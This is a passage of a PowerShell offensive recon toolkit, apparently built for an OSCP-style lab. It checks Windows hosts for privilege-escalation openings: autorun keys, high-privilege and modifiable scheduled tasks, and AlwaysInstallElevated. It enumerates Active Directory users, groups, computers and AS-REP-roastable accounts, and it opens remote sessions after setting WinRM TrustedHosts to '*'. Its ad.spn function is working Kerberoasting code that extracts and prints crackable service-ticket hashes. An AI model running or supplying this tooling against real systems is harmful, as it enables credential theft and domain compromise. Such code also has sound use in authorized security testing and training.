    @("HKLM:\Software\Microsoft\Windows\CurrentVersion\Run","HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce","HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run","HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce","HKCU:\Software\Microsoft\Windows\CurrentVersion\Run","HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce","HKCU:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run","HKCU:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce","HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run","HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce","HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE","HKLM:\Software\Microsoft\Windows\RunOnceEx","HKLM:\Software\Wow6432Node\Microsoft\Windows\RunOnceEx","HKCU:\Software\Microsoft\Windows\RunOnceEx","HKCU:\Software\Wow6432Node\Microsoft\Windows\RunOnceEx","HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce","HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce","HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices","HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServices","HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce","HKCU:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce","HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices","HKCU:\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices","HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon") | ForEach-Object {if(Test-Path $_){echo "";echo $_;echo "";Get-ItemProperty $_}}

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "           Scheduled tasks with highest privileges "
    Write-Host " ##############################################################"
    Get-ScheduledTask | where {$_.principal.RunLevel -eq "Highest"} | Where-Object {$Null -ne $_.Actions.Execute} | ft TaskName,TaskPath,State

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "         Scheduled tasks with MODIFIABLE privileges"
    Write-Host " ##############################################################"
    Get-ScheduledTask -ErrorAction Ignore | where {$_.principal.RunLevel -eq "Highest"} | Where-Object {$Null -ne $_.Actions.Execute} | ForEach-Object { if(ModifiablePath $_.Actions.Execute){ $_ } }

}

# A simple tool similar to pspy to monitor executed commands and processes
function recon.pspy(){
    while($true)
    {
        $process = Get-WmiObject Win32_Process | Select-Object CommandLine
        Start-Sleep 0.2
        $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
        Compare-Object -ReferenceObject $process -DifferenceObject $process2
    }

}

#Checks if installation with elevated privileges is possible
function priv.installElev(){
    if((Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated -eq 1){echo " [!] VULNERABLE!"}
    elseif((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated -eq 1){echo " [!] VULNERABLE!"}
    else{ echo " [-] Not vulnerable." }
}



#--------------------------------------------
#  * AD - Active session on another machine *
#--------------------------------------------
function ad.psremote {
    param (
        [string]$Username,
        [string]$Password,
        [string]$Hostname
    )

    # Verifying if all required parameters are provided
    if (-not ($Username -and $Password -and $Hostname)) {
        Write-Host ""
        Write-Host " [>] Connect to remote session:"
        Write-Host "        ad.psremote <dom>\<user> <pass> <host>"
        return
    }

    winrm set winrm/config/client '@{TrustedHosts="*"}'
    $securePassword = ConvertTo-SecureString $Password -AsPlainText -Force
    $credentials = New-Object System.Management.Automation.PSCredential -ArgumentList @($Username, $securePassword)
    Enter-PSSession -ComputerName $Hostname -Credential $credentials
}

# Displaying syntax if not all required parameters are provided
if ($PSBoundParameters.Count -lt $PSBoundParameters.Keys.Count) {
    Write-Host "Incorrect syntax. Usage:"
    Write-Host "ad.psremote -Username <user> -Password <password> -Hostname <Ip>"
}


#----------------------------------------------
#  * AD - Auxiliary function for LDAP queries *
#----------------------------------------------
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}


#------------------------------------------
#  * AD - List user accounts *
#------------------------------------------
function ad.listusers {
    LDAPSearch -LDAPQuery "(samAccountType=805306368)" | ForEach-Object { $_.Properties['samaccountname'] }
}


#------------------------------------------
#  * AD - Query user accounts *
#------------------------------------------
function ad.users {
    $result = LDAPSearch -LDAPQuery "(&(samAccountType=805306368)(!distinguishedName=CN=Builtin,DC=oscp,DC=exam))"
    Foreach($obj in $result)
    {
        Write-Host "-------------------------------"
        Write-Host " [*] "$obj.Properties['name']
        Write-Host "-------------------------------"
        Write-Host "Last Change: "$obj.Properties['whenChanged']
        Write-Host "Description: "$obj.Properties['description']
        Write-Host "Groups:"
        Foreach($obj2 in $obj.Properties['memberOf']){
            $grupo = LDAPSearch -LDAPQuery "(&(objectCategory=*)(distinguishedName=$obj2))"
            Write-Host " [>] "$grupo.Properties['name']" - "$grupo.Properties['description']
        }
        Write-Host ""
        Write-Host ""
    }
}


#------------------------------------------
#  * AD - Get information about a user *
#------------------------------------------
function ad.user {
    param (
        [string]$Username
    )
    # Verifying if the username is provided
    if (-not $Username) {
        Write-Host ""
        Write-Host " [>] Information about a user:"
        Write-Host "        ad.user <username>"
        return
    }
    # Querying for the specified user
    $result = LDAPSearch -LDAPQuery "(&(objectCategory=user)(objectClass=user)(cn=$Username))"
    $result.Properties
    Write-Host "-----------------------------------"
    Write-Host "Groups:"
    Write-Host ""
    # Getting information about groups the user belongs to
    Foreach($obj2 in $result.Properties['memberOf']){
        $grupo = LDAPSearch -LDAPQuery "(&(objectCategory=*)(distinguishedName=$obj2))"
        Write-Host " [>] "$grupo.Properties['name']" - "$grupo.Properties['description']
    }
}


#------------------------------------------
#  * AD - Query domain groups *
#------------------------------------------
function ad.groups {
    $result = LDAPSearch -LDAPQuery "(&(objectCategory=group)(!distinguishedName=CN=Builtin,DC=oscp,DC=exam))"
    Foreach($obj in $result)
    {
        Write-Host "-------------------------------"
        Write-Host " [*] "$obj.Properties['name']
        Write-Host "-------------------------------"
        Write-Host "Admincount:  "$obj.Properties['admincount']
        Write-Host "DN:          "$obj.Properties['distinguishedname']
        Write-Host "Description: "$obj.Properties['description']
        Write-Host "Members:"
        Foreach($obj2 in $obj.Properties['member']){
            $miembro = LDAPSearch -LDAPQuery "(&(objectCategory=*)(distinguishedName=$obj2))"
            Write-Host " [>] "$miembro.Properties['name']" - "$miembro.Properties['description']
        }
        Write-Host ""
        Write-Host ""
    }
}


#------------------------------------------
#  * AD - All information about a group *
#------------------------------------------
function ad.group {
    param (
        [string]$Group
    )
    # Verify that the group name is provided
    if (-not $Group) {
        Write-Host ""
        Write-Host " [>] Information about a group:"
        Write-Host "        ad.group <groupName>"
        return
    }
    # Querying for information about the specified group
    $result = LDAPSearch -LDAPQuery "(&(objectClass=group)(cn=$Group))"
    $result.Properties
    Write-Host "-----------------------------------"
    Write-Host "Groups:"
    Write-Host ""
    Foreach($obj2 in $result.Properties['member']){
        $miembro = LDAPSearch -LDAPQuery "(&(objectCategory=*)(distinguishedName=$obj2))"
        Write-Host " [>] "$miembro.Properties['name']" - "$miembro.Properties['description']
    }
}


#------------------------------------------
#  * AD - Domain computers *
#------------------------------------------
function ad.computers {
    $result = LDAPSearch -LDAPQuery "(&(objectCategory=computer)(objectClass=computer))"
    Write-Host ""
    Foreach($obj in $result)
    {
        $ip = [System.Net.Dns]::GetHostAddresses($obj.Properties['dnshostname']) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -ExpandProperty IPAddressToString
        Write-Host " [>] "$obj.Properties['dnshostname'] "("$ip" ) - " $obj.Properties['operatingsystem'] $obj.Properties['operatingsystemversion']
    }
    Write-Host ""
    Write-Host ""
}


#------------------------------------------
#  * AD - Service accounts *
#------------------------------------------
function ad.spn {
    $result = LDAPSearch -LDAPQuery "(&(objectCategory=user)(objectClass=user)(servicePrincipalName=*))"
    Add-Type -AssemblyName System.IdentityModel
    Foreach($obj in $result)
    {
        Write-Host "-------------------------------"
        Write-Host " [*] "$obj.Properties['name']
        Write-Host "-------------------------------"
        Write-Host "SPN:         "$obj.Properties['serviceprincipalname']
        Write-Host "Description: "$obj.Properties['description']
        Write-Host ""
        #Try to get the tickets (based on powerview)
        try{
            $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $obj.Properties.serviceprincipalname
            $TicketByteStream = $Ticket.GetRequest()
            $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
            if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
                $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                Write-Host "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
            }
            Write-Host ""
            Write-Host ""
        }
        catch {
            Write-Host " [-] Error on ticket request"
            Write-Host ""
        }
    }
}


#------------------------------------------
#  * AD - AS-REP Roasting accounts *
#------------------------------------------
function ad.asrep {
    $result = LDAPSearch -LDAPQuery "(&(objectCategory=user)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
    Write-Host ""
    Foreach($obj in $result)
    {
        Write-Host " [>] "$obj.Properties['name'] " - " $obj.Properties['description']
    }
    Write-Host ""
    Write-Host ""
}





function Get-ServiceAcl {
    [CmdletBinding(DefaultParameterSetName="ByName")]
    param(
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true, ParameterSetName="ByName")]
        [string[]] $Name,
        [Parameter(Mandatory=$true, Position=0, ParameterSetName="ByDisplayName")]
        [string[]] $DisplayName,
        [Parameter(Mandatory=$false, Position=1)]
        [string] $ComputerName = $env:COMPUTERNAME
    )
 
    # If display name was provided, get the actual service name:
    switch ($PSCmdlet.ParameterSetName) {
        "ByDisplayName" {
            $Name = Get-Service -DisplayName $DisplayName -ComputerName $ComputerName -ErrorAction Stop | 
                Select-Object -ExpandProperty Name
        }
    }
 
    # Make sure computer has 'sc.exe':
    $ServiceControlCmd = Get-Command "$env:SystemRoot\system32\sc.exe"
    if (-not $ServiceControlCmd) {
        throw "Could not find $env:SystemRoot\system32\sc.exe command!"
    }
 
    # Get-Service does the work looking up the service the user requested:
    Get-Service -Name $Name | ForEach-Object {
         
        # We might need this info in catch block, so store it to a variable
        $CurrentName = $_.Name
 
        # Get SDDL using sc.exe
        $Sddl = & $ServiceControlCmd.Definition "\\$ComputerName" sdshow "$CurrentName" | Where-Object { $_ }
 
        try {
            # Get the DACL from the SDDL string
            $Dacl = New-Object System.Security.AccessControl.RawSecurityDescriptor($Sddl)
        }
        catch {
            Write-Warning "Couldn't get security descriptor for service '$CurrentName': $Sddl"
            return
        }
 
        # Create the custom object with the note properties
        $CustomObject = New-Object -TypeName PSObject -Property ([ordered] @{ Name = $_.Name
                                                                              Dacl = $Dacl
                                                                            })
 
        # Add the 'Access' property:
        $CustomObject | Add-Member -MemberType ScriptProperty -Name Access -Value {
            $this.Dacl.DiscretionaryAcl | ForEach-Object {
                $CurrentDacl = $_
 
                try {
                    $IdentityReference = $CurrentDacl.SecurityIdentifier.Translate([System.Security.Principal.NTAccount])
                }
                catch {
                    $IdentityReference = $CurrentDacl.SecurityIdentifier.Value
                }
                 
                New-Object -TypeName PSObject -Property ([ordered] @{ 
                                ServiceRights = [ServiceAccessFlags] $CurrentDacl.AccessMask
                                AccessControlType = $CurrentDacl.AceType
                                IdentityReference = $IdentityReference
                                IsInherited = $CurrentDacl.IsInherited
                                InheritanceFlags = $CurrentDacl.InheritanceFlags
                                PropagationFlags = $CurrentDacl.PropagationFlags
                                                                    })
            }
        }
 
        # Add 'AccessToString' property that mimics a property of the same name from normal Get-Acl call
        $CustomObject | Add-Member -MemberType ScriptProperty -Name AccessToString -Value {
            $this.Access | ForEach-Object {
                "{0} {1} {2}" -f $_.IdentityReference, $_.AccessControlType, $_.ServiceRights
            } | Out-String
        }
 
        $CustomObject
    }
}




function ModifiablePath {
    param ([Parameter(Mandatory = $true)][String[]]$Paths);
    $Sids = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | Select-Object -ExpandProperty Value;$Sids += $UserIdentity.User.Value;
    ForEach($Path in $Paths){try{$Path=$Path.Replace('"', "");
        if (-Not(Test-Path -Path $Path -ErrorAction Stop)){
            $Path=Split-Path -Path $Path -Parent};
        if (Test-Path -Path $Path -ErrorAction Stop) {
            $FILE=Resolve-Path -Path $Path | Select-Object -ExpandProperty Path;
            Get-Acl -Path $Path | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {if($_.FileSystemRights){$Rights = $_.FileSystemRights.value__}
        else{
            $Rights = $_.RegistryRights.value__};if(@([uint32]'0x40000000',[uint32]'0x10000000',[uint32]'0x02000000',[uint32]'0x00080000',[uint32]'0x00040000',[uint32]'0x00000004',[uint32]'0x00000002') | Where-Object { $Rights -band $_ }){
                if ($Sids -contains $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExcludeProperty Value) {$Path}}}}}catch{$false}}}


#Get-LogonSession | where username -eq yamcha
#Get-LogonSession | select Username, logontype,authenticationpackage


function Get-LogonSession
{
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [string[]]
        $ComputerName = 'localhost'
    )

    $LogonMap = @{}
    Get-WmiObject -ComputerName $ComputerName -Class Win32_LoggedOnUser  | %{
    
        $Identity = $_.Antecedent | Select-String 'Domain="(.*)",Name="(.*)"'
        $LogonSession = $_.Dependent | Select-String 'LogonId="(\d+)"'

        $LogonMap[$LogonSession.Matches[0].Groups[1].Value] = New-Object PSObject -Property @{
            Domain = $Identity.Matches[0].Groups[1].Value
            UserName = $Identity.Matches[0].Groups[2].Value
        }
    }

    Get-WmiObject -ComputerName $ComputerName -Class Win32_LogonSession | %{
        $LogonType = $Null
        switch($_.LogonType) {
            $null {$LogonType = 'None'}
            0 { $LogonType = 'System' }
            2 { $LogonType = 'Interactive' }
            3 { $LogonType = 'Network' }
            4 { $LogonType = 'Batch' }
            5 { $LogonType = 'Service' }
            6 { $LogonType = 'Proxy' }
            7 { $LogonType = 'Unlock' }
            8 { $LogonType = 'NetworkCleartext' }
            9 { $LogonType = 'NewCredentials' }
            10 { $LogonType = 'RemoteInteractive' }
            11 { $LogonType = 'CachedInteractive' }
            12 { $LogonType = 'CachedRemoteInteractive' }
            13 { $LogonType = 'CachedUnlock' }
            default { $LogonType = $_.LogonType}
        }

        New-Object PSObject -Property @{
            UserName = $LogonMap[$_.LogonId].UserName
            Domain = $LogonMap[$_.LogonId].Domain
            LogonId = $_.LogonId
            LogonType = $LogonType
            AuthenticationPackage = $_.AuthenticationPackage
            Caption = $_.Caption
            Description = $_.Description
            InstallDate = $_.InstallDate
            Name = $_.Name
            StartTime = $_.ConvertToDateTime($_.StartTime)
            ComputerName = $_.PSComputerName
        }
    }
}


function Get-LogonSessionProc
{
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [int]
        $Type
    )

    if($Type) {
        Get-WmiObject Win32_LogonSession -Filter "LogonType=$Type" 
    } else {
        Get-WmiObject Win32_LogonSession
    }
}

# Get-LogonSessionProcesses -id 98765
function Get-LogonSessionProcesses
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [int[]]
        $Id
    )
  
    foreach($LogonId in $Id)
    {
        Get-WmiObject -Query ("ASSOCIATORS OF {Win32_LogonSession.LogonId=$LogonId} WHERE ResultClass = Win32_Process")
    }
}


function Banner {
    $banner = @'

     ___  __    ___   ___                            
    /___\/ _\  / __\ / _ \  _ __ ___  ___ ___  _ __  
   //  //\ \  / /   / /_)/ | '__/ _ \/ __/ _ \| '_ \  
  / \_// _\ \/ /___/ ___/  | | |  __/ (_| (_) | | | |
  \___/  \__/\____/\/      |_|  \___|\___\___/|_| |_|
                                                     
========================================================
'@
    Write-Host $banner -ForegroundColor Cyan
    Write-Host "                                            DannyDB@~>" -ForegroundColor Green
    Write-Host ""
}



#------------------------------------------
#  * Check if kali ip is seted *
#------------------------------------------
if ($IP_KALI -match "IP_KALI") {
    Clear-Host
    Write-Host ""
    Write-Host " [>] Please enter the IP address for Kali: " -NoNewline
    $IP_KALI = Read-Host
    Write-Host ""
}
recon.help
